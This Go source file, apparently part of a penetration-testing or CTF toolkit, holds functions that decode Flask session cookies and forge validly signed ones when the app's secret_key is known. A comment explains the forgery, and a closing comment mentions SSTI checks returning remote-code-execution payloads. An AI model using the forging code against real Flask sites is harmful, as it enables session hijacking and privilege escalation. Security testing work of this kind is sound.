/*
Package flask

	ParseSession: Resolve the session based on the secretKey provided
	ForgeSession: Fake a session based on the secretKey provided

*/
package flask

import (
	"crypto/hmac"
	"crypto/sha1"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"log"
	"strings"
	"time"
)

// ParseSession Resolve the session based on the secretKey provided
// Warning: Not Finished.
func ParseSession(secret string, session string) (map[string]string, error) {
	sess := strings.Split(session, ".")
	salt := "cookie-session"

	signer := hmac.New(sha1.New, []byte(secret))
	signer.Write([]byte(salt))
	signer = hmac.New(sha1.New, signer.Sum(nil))

	sig, err := base64.URLEncoding.WithPadding(base64.NoPadding).DecodeString(sess[2])
	if err != nil {
		log.Fatal(err)
		return nil, err
	}
	val := sess[0] + "." + sess[1]
	signer.Write([]byte(val))
	if !hmac.Equal(sig, signer.Sum(nil)) {
		fmt.Println("Unable to verify signature, Try to parse session.")
	}
	dataByte, err := base64.StdEncoding.WithPadding(base64.NoPadding).DecodeString(sess[0])
	if err != nil {
		log.Fatal(err)
		return nil, err
	}
	var data map[string]string
	json.Unmarshal(dataByte, &data)
	return data, nil
}

// ForgeSession Fake a session based on the secretKey provided
// Warning: Not Finished.
/*
Flask's Session has three parts, the first two of which store session
information and a timestamp, and the last part is a hash of the first two.
Hash uses a salt and a secret_key, the salt is fixed in the flask library
and does not normally change, being fixed to 'cookie-session', while the
secret_key is required to be set by the developer.
Therefore, if you can get the secret_key, you can forge the session.
*/
func ForgeSession(secret string, session map[string]string) (string, error) {
	jsonSess, _ := json.Marshal(session)
	timeStamp := make([]byte, 4)
	binary.BigEndian.PutUint32(timeStamp, uint32(time.Now().Unix()))
	sess := base64.StdEncoding.WithPadding(base64.NoPadding).EncodeToString(jsonSess)
	sess = sess + "." + base64.StdEncoding.WithPadding(base64.NoPadding).EncodeToString(timeStamp)

	salt := "cookie-session"
	signer := hmac.New(sha1.New, []byte(secret))
	signer.Write([]byte(salt))
	signer = hmac.New(sha1.New, signer.Sum(nil))
	signer.Write([]byte(sess))
	sig := signer.Sum(nil)

	sess = sess + "." + base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(sig)
	return sess, nil
}

// SSTI Server-Side Template Injection
// Attempt to verify the presence of template injection and return RCE payloads
